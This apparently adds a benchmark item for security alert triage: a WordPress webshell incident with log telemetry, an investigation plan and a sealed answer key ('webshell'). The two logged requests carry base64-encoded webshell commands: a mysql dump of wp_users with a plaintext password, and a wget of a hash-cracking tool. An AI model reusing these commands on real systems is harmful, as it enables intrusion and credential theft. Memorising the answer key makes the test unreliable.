@@ -1,0 +1,168 @@
+{
+  "incident_id": "ait-fox-webshell",
+  "name": "AIT-ADS fox/webshell",
+  "source_benchmark": "Cyber-AIT-ADS",
+  "source_scenario": "fox/webshell",
+  "alert": {
+    "timestamp": "2022-01-18T12:38:25Z",
+    "host": "fox",
+    "user": "unknown",
+    "alert_type": "ait_ads_stage",
+    "summary": "AIT-ADS multi-step stage candidate on fox. Identify the attack stage from telemetry."
+  },
+  "scope": {
+    "allowed_log_sources": [
+      "alerts"
+    ],
+    "start": "2022-01-18T12:38:25Z",
+    "end": "2022-01-18T12:38:29Z",
+    "hosts": [
+      "fox"
+    ]
+  },
+  "telemetry": {
+    "alerts": [
+      {
+        "event_id": "ait-0001-6d38c747",
+        "timestamp": "2022-01-18T12:38:25Z",
+        "host": "fox",
+        "detector": "AMiner: High entropy in Apache Access request.",
+        "message": "172.17.130.196 - - [18/Jan/2022:12:38:25 +0000] \"GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJteXNxbCIsICItdSIsICJ3b3JkcHJlc3MiLCAiLXB0YWlub294M2FlZGVlU2giLCAid29yZHByZXNzX2RiIiwgIi1lIiwgIlwic2VsZWN0ICogZnJvbSB3cF91c2Vyc1wiIl0%3D HTTP/1.1\" 200 507795 \"-\" \"python-requests/2.27.1\"",
+        "raw_alert": {
+          "timestamp": 1642509505.0,
+          "detector": "AMiner: High entropy in Apache Access request.",
+          "message": "172.17.130.196 - - [18/Jan/2022:12:38:25 +0000] \"GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJteXNxbCIsICItdSIsICJ3b3JkcHJlc3MiLCAiLXB0YWlub294M2FlZGVlU2giLCAid29yZHByZXNzX2RiIiwgIi1lIiwgIlwic2VsZWN0ICogZnJvbSB3cF91c2Vyc1wiIl0%3D HTTP/1.1\" 200 507795 \"-\" \"python-requests/2.27.1\""
+        }
+      },
+      {
+        "event_id": "ait-0002-8d61bb42",
+        "timestamp": "2022-01-18T12:38:29Z",
+        "host": "fox",
+        "detector": "AMiner: High entropy in Apache Access request.",
+        "message": "172.17.130.196 - - [18/Jan/2022:12:38:29 +0000] \"GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D HTTP/1.1\" 200 506717 \"-\" \"python-requests/2.27.1\"",
+        "raw_alert": {
+          "timestamp": 1642509509.0,
+          "detector": "AMiner: High entropy in Apache Access request.",
+          "message": "172.17.130.196 - - [18/Jan/2022:12:38:29 +0000] \"GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D HTTP/1.1\" 200 506717 \"-\" \"python-requests/2.27.1\""
+        }
+      }
+    ]
+  },
+  "oracle_evidence": [
+    {
+      "event_id": "ait-0001-6d38c747",
+      "source": "alerts",
+      "timestamp": "2022-01-18T12:38:25Z",
+      "host": "fox",
+      "fields": {
+        "detector": "AMiner: High entropy in Apache Access request.",
+        "message": "172.17.130.196 - - [18/Jan/2022:12:38:25 +0000] \"GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJteXNxbCIsICItdSIsICJ3b3JkcHJlc3MiLCAiLXB0YWlub294M2FlZGVlU2giLCAid29yZHByZXNzX2RiIiwgIi1lIiwgIlwic2VsZWN0ICogZnJvbSB3cF91c2Vyc1wiIl0%3D HTTP/1.1\" 200 507795 \"-\" \"python-requests/2.27.1\"",
+        "raw_alert": {
+          "timestamp": 1642509505.0,
+          "detector": "AMiner: High entropy in Apache Access request.",
+          "message": "172.17.130.196 - - [18/Jan/2022:12:38:25 +0000] \"GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJteXNxbCIsICItdSIsICJ3b3JkcHJlc3MiLCAiLXB0YWlub294M2FlZGVlU2giLCAid29yZHByZXNzX2RiIiwgIi1lIiwgIlwic2VsZWN0ICogZnJvbSB3cF91c2Vyc1wiIl0%3D HTTP/1.1\" 200 507795 \"-\" \"python-requests/2.27.1\""
+        }
+      }
+    },
+    {
+      "event_id": "ait-0002-8d61bb42",
+      "source": "alerts",
+      "timestamp": "2022-01-18T12:38:29Z",
+      "host": "fox",
+      "fields": {
+        "detector": "AMiner: High entropy in Apache Access request.",
+        "message": "172.17.130.196 - - [18/Jan/2022:12:38:29 +0000] \"GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D HTTP/1.1\" 200 506717 \"-\" \"python-requests/2.27.1\"",
+        "raw_alert": {
+          "timestamp": 1642509509.0,
+          "detector": "AMiner: High entropy in Apache Access request.",
+          "message": "172.17.130.196 - - [18/Jan/2022:12:38:29 +0000] \"GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D HTTP/1.1\" 200 506717 \"-\" \"python-requests/2.27.1\""
+        }
+      }
+    }
+  ],
+  "oracle_plan": [
+    {
+      "order": 1,
+      "question": "What processes or alerts fired in the investigation window?",
+      "tool": "query_events",
+      "arguments": {
+        "source": "alerts",
+        "filter": {
+          "host": "fox"
+        },
+        "limit": 50
+      }
+    },
+    {
+      "order": 2,
+      "question": "Are there related network or secondary signals on this host?",
+      "tool": "query_events",
+      "arguments": {
+        "source": "alerts",
+        "filter": {
+          "host": "fox"
+        },
+        "limit": 50
+      }
+    },
+    {
+      "order": 3,
+      "question": "What ATT&CK or detection knowledge matches this alert?",
+      "tool": "retrieve_knowledge",
+      "arguments": {
+        "question": "AIT-ADS multi-step stage candidate on fox. Identify the attack stage from telemetry.",
+        "corpus_tags": [
+          "detection",
+          "attack"
+        ],
+        "top_k": 3
+      }
+    }
+  ],
+  "fixed_query_pack": {
+    "version": "converted-pack-v1",
+    "queries": [
+      {
+        "tool": "query_events",
+        "arguments": {
+          "source": "alerts",
+          "filter": {
+            "host": "fox"
+          },
+          "limit": 50
+        }
+      },
+      {
+        "tool": "query_events",
+        "arguments": {
+          "source": "alerts",
+          "filter": {
+            "host": "fox"
+          },
+          "limit": 50
+        }
+      },
+      {
+        "tool": "retrieve_knowledge",
+        "arguments": {
+          "question": "AIT-ADS multi-step stage candidate on fox. Identify the attack stage from telemetry.",
+          "corpus_tags": [
+            "detection"
+          ],
+          "top_k": 3
+        }
+      }
+    ]
+  },
+  "ground_truth": {
+    "dataset": "Cyber-AIT-ADS",
+    "scenario": "fox/webshell",
+    "answer": "webshell",
+    "accept": [
+      "webshell",
+      "webshell"
+    ],
+    "grading": "exact_ci",
+    "sealed": true
+  }
+}
